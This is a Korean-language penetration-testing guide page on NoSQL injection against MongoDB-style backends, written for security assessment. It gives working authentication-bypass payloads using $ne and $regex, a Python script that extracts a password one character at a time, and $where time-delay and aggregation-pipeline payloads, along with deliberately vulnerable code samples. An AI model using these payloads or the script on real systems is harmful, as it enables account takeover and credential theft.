---
sidebar_position: 28
title: NoSQL Injection
description: 웹 진단 - MongoDB / CouchDB NoSQL Injection 점검 절차, 연산자 인젝션, 인증 우회, Blind 추출, 판정 기준
keywords: [NoSQL Injection, MongoDB, CouchDB, Operator Injection, $ne, $regex, $where, Authentication Bypass, OWASP A05]
draft: false
---

# NoSQL 인젝션
> NoSQL 데이터베이스 (MongoDB / CouchDB 등) 의 쿼리에 사용자 입력이 **연산자 객체** 로 그대로 전달되어 발생.
> 가장 흔한 패턴은 **로그인 인증 우회** — `$ne` / `$regex` 한 줄로 비밀번호 검증 무력화.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A05:2025 - Injection / KISA 입력 데이터 검증 |
| **CWE** | [CWE-943: Improper Neutralization of Special Elements in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html), [CWE-89](https://cwe.mitre.org/data/definitions/89.html) (Injection 일반) |
| **영향도** | 🔴 (인증 우회 / 데이터 추출 / `$where` RCE) / 🟡 (제한적 정보 노출) |
| **점검 난이도** | 하 (인증 우회는 단순) / 중 (Blind 추출 자동화) |
| **예상 점검 시간** | 1 ~ 4시간 |

---

## 점검 목적

NoSQL 백엔드 (특히 MongoDB) 가 사용자 입력의 **JSON 객체 / 연산자** 를 그대로 쿼리에 매핑하는지 확인한다. 클라이언트가 `{"password": {"$ne": null}}` 같은 연산자 객체를 보냈을 때 서버가 그대로 `db.users.find()` 에 사용하면 인증 우회 / 데이터 추출 가능.

> **다른 페이지와 영역 분리**
> - SQL Injection → `sql-injection.md`. NoSQL 은 **연산자 객체 인젝션** 이 핵심 (vs SQL 의 문법 인젝션)
> - JSON CSRF → `csrf.md` 케이스 6
> - GraphQL 인젝션 → 별도 (본 페이지에서 한 줄 언급)
> - Mongo 의 `$where` JavaScript 평가 → 본 페이지에서 RCE 케이스로 다룸

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **연산자 객체 인젝션 (인증 우회)** | `{"password": {"$ne": null}}` 으로 비밀번호 검증 무력화 |
| **정규식 추출 (Blind)** | `{"password": {"$regex": "^a"}}` 으로 한 글자씩 추출 |
| **타입 캐스팅 인젝션** | URL 파라미터에서 `password[$ne]=x` 형태 (Express `qs` 파서 등) |
| **`$where` JavaScript 평가** | `{"$where": "sleep(5000)"}` Time-based / 잠재 RCE |
| **연산자 화이트리스트 우회** | `$where`, `$function` (Mongo 4.4+), `mapReduce` |
| **Aggregation pipeline 인젝션** | `$lookup`, `$out` 단계 변조로 다른 컬렉션 조회/쓰기 |

---

## 진단 절차

### Step 1. 백엔드 / DB 식별

- 응답 헤더 / 에러 메시지에 Node.js / Express / Python / MongoDB 단서
- 쿠키 이름 (`connect.sid` → Express), Stack 단서
- MongoDB 의심 신호: 응답 본문에 `ObjectId(...)` 형태의 ID, `_id` 필드, `$` 시작 키

### Step 2. 진입점 식별

NoSQL 백엔드 의심 시 우선 점검:

- 로그인 (`/login`, `/api/auth/signin`) — 인증 우회 최우선
- 검색 / 필터 API — 쿼리 파라미터를 쿼리에 직접 사용하는 패턴
- 댓글 / 게시글 / 사용자 검색 — 정규식 인젝션 가능성
- 비밀번호 재설정 토큰 검증

### Step 3. 기본 탐지

- 일반 문자열 입력에 `$ne`, `$gt`, `$regex` 연산자 객체 시도
- URL 인코딩 / JSON / form-urlencoded 세 가지 모두 시도
- 응답 차이 (200 / 401 / 500) + 본문 비교

### Step 4. 영향 입증

- 인증 우회: 임의 사용자 / 관리자 계정 로그인 성공
- 데이터 추출: `$regex` Blind 자동화로 비밀번호 / 토큰 추출
- Time-based: `$where: "sleep(N)"` 으로 응답 지연 확인

---

## 페이로드 / 테스트 케이스

### 케이스 1: 로그인 인증 우회
**언제 쓰는지**: Node.js / Express / MongoDB 의심 로그인 API. 첫 시도.

**1-1. JSON 본문 (가장 흔한 패턴):**

```http
POST /api/auth/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": null}}
```

**시도 변형:**

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
```

**1-2. URL / form-urlencoded (Express `qs` 파서 등 자동 객체 변환):**

```
username=admin&password[$ne]=x
username[$ne]=x&password[$ne]=x
username[$regex]=^admin&password[$ne]=x
```

Express 의 기본 `qs` 미들웨어는 `password[$ne]=x` 를 `{password: {$ne: 'x'}}` 객체로 자동 파싱 → 백엔드가 그대로 쿼리에 사용하면 인증 우회.

**판정**: 위 페이로드 중 하나로 로그인 성공 (세션 발급 / 200 OK + 사용자 정보 응답) 하면 취약. 백엔드 패턴:

```javascript
// 위험 — 클라이언트 객체를 그대로 쿼리에
const user = await User.findOne({
    username: req.body.username,
    password: req.body.password    // {$ne: null} 그대로 매핑됨
});
```

### 케이스 2: 정규식 Blind 추출
**언제 쓰는지**: 인증 우회는 차단됐지만 정규식 객체는 통과하는 경우. 응답이 200 / 401 로 명확히 갈리는 흐름에서 한 글자씩 추출.

**기본 추출 페이로드:**

```json
{"username": "admin", "password": {"$regex": "^a"}}     ← 응답: 401 (False)
{"username": "admin", "password": {"$regex": "^p"}}     ← 응답: 200 (True)
{"username": "admin", "password": {"$regex": "^pa"}}    ← 200
{"username": "admin", "password": {"$regex": "^pas"}}   ← 200
{"username": "admin", "password": {"$regex": "^pass"}}  ← 200
```

**자동화 스크립트 (Python):**

```python
import requests
import string

URL = "https://<TARGET>/api/auth/login"
USERNAME = "admin"
CHARSET = string.ascii_lowercase + string.digits + "!@#$%^&*"

password = ""
while True:
    found = False
    for c in CHARSET:
        # 정규식 메타문자 이스케이프
        pattern = f"^{password + c}"
        r = requests.post(URL, json={
            "username": USERNAME,
            "password": {"$regex": pattern}
        })
        if r.status_code == 200 and "token" in r.text:    # True 판정 조건은 환경에 맞게
            password += c
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Final: {password}")
```

**판정**: 한 글자씩 비밀번호 / 토큰 추출 가능 → Critical. 정규식 메타문자 (`.`, `*`, `+` 등) 가 들어있는 비밀번호는 추가 처리 필요.

### 케이스 3: `$where` JavaScript 평가
**언제 쓰는지**: Mongo 4.2 이하 또는 `$where` 가 활성화된 환경. Time-based Blind 확인 + 잠재 코드 평가.

**시간 지연 페이로드:**

```json
{"$where": "sleep(5000)"}
{"username": "admin", "password": {"$where": "sleep(5000)"}}
{"username": "admin", "$where": "function() { return this.username === 'admin' && sleep(5000); }"}
```

**판정**: 응답 시간이 약 5초 지연되면 `$where` 평가 가능 → Time-based 인젝션 확정 + JavaScript 코드 평가가 일어남. Mongo 의 `$where` 는 일반적으로 OS RCE 까진 안 가지만, 노출되어 있다는 것만으로 결함 등급 High.

> Mongo 4.4+ 에서 `$where` 는 보안 모드에서 제한되거나 비활성화됨. 발견 시 DB 버전 / 설정 함께 보고.

### 케이스 4: 검색 / 필터 API 의 연산자 인젝션

**언제 쓰는지**: 로그인이 아닌 검색 / 필터 / 정렬 / 페이지네이션 파라미터.

**시나리오:**

```http
GET /api/products?category[$ne]=null HTTP/1.1
GET /api/products?price[$lt]=99999999 HTTP/1.1
GET /api/products?name[$regex]=.* HTTP/1.1

# 또는 정렬 변조
GET /api/products?sort[password]=-1 HTTP/1.1
```

**판정**:
- 의도된 동작 (카테고리 필터) 과 다른 응답 (전체 데이터 노출 / 다른 컬렉션 데이터) 이면 결함
- 정렬 파라미터로 비공개 필드 노출 (`?sort[password]=-1` → 응답 순서로 비밀번호 추측 등) 가능 시 High

### 케이스 5: Aggregation Pipeline 인젝션
**언제 쓰는지**: 클라이언트가 보낸 객체가 Aggregation pipeline 의 단계로 직접 매핑되는 경우. 드물지만 임팩트 큼.

**위험 패턴:**

```javascript
// 위험 — 클라이언트가 보낸 filter 가 그대로 $match 에 사용
const pipeline = [
    { $match: req.body.filter },          // 임의 단계 객체 매핑 가능
    { $project: { ... } }
];
db.users.aggregate(pipeline);
```

**악용 시도:**

```json
{
  "filter": {
    "$or": [
      {"role": "admin"},
      {"$where": "sleep(5000)"}
    ]
  }
}
```

또는 `$lookup` / `$out` 단계 인젝션 (다른 컬렉션 조인 / 결과를 다른 컬렉션에 쓰기) — DB 측 권한이 있으면 데이터 수정까지 가능.

**판정**: aggregation 단계가 변조되어 다른 컬렉션 데이터 노출 / 쓰기 발생 시 Critical.

### 케이스 6: NoSQLMap
**언제 쓰는지**: 수동 점검으로 패턴 확정 후, 전수 자동화 시.

```bash
# 인증 우회 자동화
python nosqlmap.py
# 메뉴에서 NoSQLi Injection - Pre-defined attacks 선택
# 또는 직접 페이로드 입력

# Burp Intruder 의 NoSQL payload 리스트 활용도 좋음
```

**판정**: 수동 점검과 동일 — 결과 검증은 직접. 자동 도구 결과는 false positive 많으므로 보고 전 재현 확인 필수.

### 그 외 — 한 줄 언급만

- **CouchDB / Cassandra / Redis 인젝션** — CouchDB 는 MongoDB 와 유사 (`$ne`), Cassandra CQL 은 SQL 유사 (`sql-injection.md` 참고). Redis 는 인젝션보다 SSRF 결합이 흔함 (`ssrf.md`)
- **GraphQL Introspection / 쿼리 인젝션** — `/graphql` 엔드포인트 + introspection 활성. 별도 점검 항목
- **DynamoDB / Firebase** — 운영 환경마다 클라이언트 SDK 권한 모델 다름. NoSQL 인젝션 표면 작음

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 로그인에 `{"password": {"$ne": null}}` 류 페이로드로 임의 / 관리자 계정 인증 우회
- [ ] `password[$ne]=x` URL 인코딩 형태로 인증 우회 (Express `qs` 패턴)
- [ ] `$regex` Blind 추출로 비밀번호 / 토큰 한 글자씩 추출 가능
- [ ] `$where: "sleep(N)"` 으로 응답 시간 지연 확인 (Time-based)
- [ ] 검색 / 필터 API 에 연산자 객체로 의도되지 않은 데이터 노출
- [ ] Aggregation pipeline 단계 변조로 다른 컬렉션 데이터 노출 / 쓰기

**오탐 주의:**

- [ ] 일부 백엔드는 `$ne` 같은 객체를 받아도 `String()` 강제 변환으로 안전 — 응답이 실제로 인증 우회되는지 확인 필수
- [ ] `200 OK` 응답이라도 본문에 "인증 실패" 메시지일 수 있음 — 응답 코드만으로 판정 금지
- [ ] `$where` 의 `sleep` 은 일부 환경에서 Cursor 단위 적용되어 데이터 양에 비례 지연 — 정밀 측정 필요

---

## 참고자료

- [OWASP Testing Guide - Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PortSwigger - NoSQL injection](https://portswigger.net/web-security/nosql-injection)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks - NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [MongoDB - Operator Reference](https://www.mongodb.com/docs/manual/reference/operator/)
- [NoSQLMap GitHub](https://github.com/codingo/NoSQLMap)
- [Sucuri - NoSQL Injection Attacks](https://sucuri.net/guides/sql-injection-cheat-sheet/)
